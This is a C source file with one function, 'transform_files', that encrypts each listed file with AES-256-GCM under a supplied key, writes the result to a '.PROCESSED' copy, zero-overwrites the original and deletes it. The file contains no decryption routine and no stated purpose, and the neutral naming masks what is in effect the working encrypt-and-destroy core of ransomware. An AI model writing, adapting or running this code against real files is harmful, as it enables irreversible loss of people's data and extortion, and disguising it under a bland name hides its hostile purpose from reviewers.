#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/crypto.h>

void transform_files(const char **filenames, size_t count, const uint8_t *session_key)
{
    if (filenames == NULL || session_key == NULL) {
        fprintf(stderr, "transform_files: invalid arguments\n");
        return;
    }

    for (size_t idx = 0; idx < count; ++idx) {
        const char *fname = filenames[idx];
        if (fname == NULL) {
            fprintf(stderr, "transform_files: NULL filename at index %zu\n", idx);
            continue;
        }

        FILE *fin = NULL;
        FILE *fout = NULL;
        FILE *fzero = NULL;
        uint8_t *plaintext = NULL;
        uint8_t *ciphertext = NULL;
        size_t plaintext_cap = 0;
        size_t ciphertext_alloc = 0;
        size_t file_size = 0;
        long sz = 0;
        uint8_t nonce[12];
        uint8_t tag[16] = {0};
        int out_len = 0;
        int final_len = 0;
        char *outname = NULL;
        EVP_CIPHER_CTX *ctx = NULL;
        int out_created = 0;
        int out_finalized = 0;
        size_t flen = 0;

        if (RAND_bytes((unsigned char *)nonce, (int)sizeof(nonce)) != 1) {
            fprintf(stderr, "transform_files: RAND_bytes failed for %s\n", fname);
            continue;
        }

        fin = fopen(fname, "rb");
        if (fin == NULL) {
            fprintf(stderr, "transform_files: cannot open %s for reading: %s\n",
                    fname, strerror(errno));
            continue;
        }

        if (fseek(fin, 0, SEEK_END) != 0) {
            fprintf(stderr, "transform_files: fseek failed on %s: %s\n",
                    fname, strerror(errno));
            goto cleanup;
        }

        sz = ftell(fin);
        if (sz < 0) {
            fprintf(stderr, "transform_files: ftell failed on %s: %s\n",
                    fname, strerror(errno));
            goto cleanup;
        }
        file_size = (size_t)sz;

        if (fseek(fin, 0, SEEK_SET) != 0) {
            fprintf(stderr, "transform_files: fseek failed on %s: %s\n",
                    fname, strerror(errno));
            goto cleanup;
        }

        plaintext_cap = (file_size == 0) ? 1 : file_size;
        plaintext = (uint8_t *)malloc(plaintext_cap);
        if (plaintext == NULL) {
            fprintf(stderr, "transform_files: malloc(%zu) failed: %s\n",
                    plaintext_cap, strerror(errno));
            goto cleanup;
        }

        if (file_size > 0) {
            if (fread(plaintext, 1, file_size, fin) != file_size) {
                fprintf(stderr, "transform_files: short read on %s\n", fname);
                goto cleanup;
            }
        }

        if (fclose(fin) != 0) {
            fprintf(stderr, "transform_files: fclose failed on %s: %s\n",
                    fname, strerror(errno));
            fin = NULL;
            goto cleanup;
        }
        fin = NULL;

        flen = strlen(fname);
        outname = (char *)malloc(flen + sizeof(".PROCESSED"));
        if (outname == NULL) {
            fprintf(stderr, "transform_files: malloc failed for output name: %s\n",
                    strerror(errno));
            goto cleanup;
        }
        snprintf(outname, flen + sizeof(".PROCESSED"), "%s.PROCESSED", fname);

        if (file_size > (SIZE_MAX - EVP_MAX_BLOCK_LENGTH)) {
            fprintf(stderr, "transform_files: file too large: %s\n", fname);
            goto cleanup;
        }

        ciphertext_alloc = file_size + EVP_MAX_BLOCK_LENGTH;
        ciphertext = (uint8_t *)malloc(ciphertext_alloc);
        if (ciphertext == NULL) {
            fprintf(stderr, "transform_files: malloc(%zu) failed: %s\n",
                    ciphertext_alloc, strerror(errno));
            goto cleanup;
        }

        ctx = EVP_CIPHER_CTX_new();
        if (ctx == NULL) {
            fprintf(stderr, "transform_files: EVP_CIPHER_CTX_new failed for %s\n", fname);
            goto cleanup;
        }

        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
            fprintf(stderr, "transform_files: EVP_EncryptInit_ex failed for %s\n", fname);
            goto cleanup;
        }

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, (int)sizeof(nonce), NULL) != 1) {
            fprintf(stderr, "transform_files: EVP_CIPHER_CTX_ctrl(SET_IVLEN) failed for %s\n", fname);
            goto cleanup;
        }

        if (EVP_EncryptInit_ex(ctx, NULL, NULL,
                               (const unsigned char *)session_key,
                               (const unsigned char *)nonce) != 1) {
            fprintf(stderr, "transform_files: EVP_EncryptInit_ex(key/iv) failed for %s\n", fname);
            goto cleanup;
        }

        if (file_size > INT_MAX) {
            fprintf(stderr, "transform_files: file too large for encryption: %s\n", fname);
            goto cleanup;
        }

        if (file_size > 0) {
            if (EVP_EncryptUpdate(ctx,
                                  (unsigned char *)ciphertext,
                                  &out_len,
                                  (const unsigned char *)plaintext,
                                  (int)file_size) != 1) {
                fprintf(stderr, "transform_files: EVP_EncryptUpdate failed for %s\n", fname);
                goto cleanup;
            }
        }

        if (EVP_EncryptFinal_ex(ctx,
                                (unsigned char *)(ciphertext + out_len),
                                &final_len) != 1) {
            fprintf(stderr, "transform_files: EVP_EncryptFinal_ex failed for %s\n", fname);
            goto cleanup;
        }
        out_len += final_len;

        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, (int)sizeof(tag), tag) != 1) {
            fprintf(stderr, "transform_files: EVP_CIPHER_CTX_ctrl(GET_TAG) failed for %s\n", fname);
            goto cleanup;
        }

        fout = fopen(outname, "wb");
        if (fout == NULL) {
            fprintf(stderr, "transform_files: cannot open %s for writing: %s\n",
                    outname, strerror(errno));
            goto cleanup;
        }
        out_created = 1;

        if (chmod(outname, 0600) != 0) {
            fprintf(stderr, "transform_files: chmod failed on %s: %s\n",
                    outname, strerror(errno));
            goto cleanup;
        }

        if (fwrite(nonce, 1, sizeof(nonce), fout) != sizeof(nonce)) {
            fprintf(stderr, "transform_files: failed writing nonce to %s: %s\n",
                    outname, strerror(errno));
            goto cleanup;
        }

        if (out_len > 0) {
            if (fwrite(ciphertext, 1, (size_t)out_len, fout) != (size_t)out_len) {
                fprintf(stderr, "transform_files: failed writing ciphertext to %s: %s\n",
                        outname, strerror(errno));
                goto cleanup;
            }
        }

        if (fwrite(tag, 1, sizeof(tag), fout) != sizeof(tag)) {
            fprintf(stderr, "transform_files: failed writing tag to %s: %s\n",
                    outname, strerror(errno));
            goto cleanup;
        }

        if (fclose(fout) != 0) {
            fprintf(stderr, "transform_files: fclose failed on %s: %s\n",
                    outname, strerror(errno));
            fout = NULL;
            goto cleanup;
        }
        fout = NULL;
        out_finalized = 1;

        fzero = fopen(fname, "r+b");
        if (fzero == NULL) {
            fprintf(stderr, "transform_files: cannot open %s for zeroing: %s\n",
                    fname, strerror(errno));
            goto cleanup;
        }

        if (file_size > 0) {
            unsigned char zeros[4096] = {0};
            size_t remaining = file_size;

            while (remaining > 0) {
                size_t chunk = remaining < sizeof(zeros) ? remaining : sizeof(zeros);
                if (fwrite(zeros, 1, chunk, fzero) != chunk) {
                    fprintf(stderr, "transform_files: failed zeroing %s: %s\n",
                            fname, strerror(errno));
                    fclose(fzero);
                    fzero = NULL;
                    goto cleanup;
                }
                remaining -= chunk;
            }
        }

        if (fclose(fzero) != 0) {
            fprintf(stderr, "transform_files: fclose failed after zeroing %s: %s\n",
                    fname, strerror(errno));
            fzero = NULL;
            goto cleanup;
        }
        fzero = NULL;

        if (remove(fname) != 0) {
            fprintf(stderr, "transform_files: remove failed on %s: %s\n",
                    fname, strerror(errno));
            goto cleanup;
        }

    cleanup:
        if (fin != NULL) {
            fclose(fin);
        }
        if (fout != NULL) {
            fclose(fout);
            fout = NULL;
        }
        if (out_created && !out_finalized && outname != NULL) {
            remove(outname);
        }
        if (ctx != NULL) {
            EVP_CIPHER_CTX_free(ctx);
        }
        if (ciphertext != NULL) {
            OPENSSL_cleanse(ciphertext, ciphertext_alloc);
            free(ciphertext);
        }
        if (plaintext != NULL) {
            OPENSSL_cleanse(plaintext, plaintext_cap);
            free(plaintext);
        }
        OPENSSL_cleanse(nonce, sizeof(nonce));
        OPENSSL_cleanse(tag, sizeof(tag));
        free(outname);
    }
}